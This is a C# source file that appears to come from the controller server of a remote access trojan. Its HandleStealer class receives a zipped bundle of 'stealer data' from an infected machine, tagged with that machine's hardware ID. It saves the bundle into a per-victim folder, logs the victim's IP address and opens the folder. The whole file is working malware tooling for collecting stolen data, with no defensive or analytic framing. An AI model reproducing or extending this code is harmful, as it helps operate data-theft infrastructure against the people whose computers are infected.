using Server.Forms;
using Server.MessagePack;
using Server.Connection;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Threading.Tasks;
using Server.Helper;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO.Compression;

namespace Server.Handle_Packet
{
    public class HandleStealer
    {
        public void SaveData(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Steal");
                Methods.RecursiveDelete(fullPath);
                if (!Directory.Exists(fullPath)) Directory.CreateDirectory(fullPath);
                
                byte[] data = unpack_msgpack.ForcePathObject("zip").GetAsBytes();
                string tempzip = $"{Path.GetTempPath()}\\steal.zip";
                File.WriteAllBytes(tempzip, data);
                ZipFile.ExtractToDirectory(tempzip, fullPath);
                new HandleLogs().Addmsg($"Stealer Data From {client.Ip}:{client.ID} Saved to {fullPath}", Color.Blue);
                Process.Start(fullPath);
                //client?.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg($"Save stealer file fail {ex.Message}", Color.Red);
            }
        }
    }
}
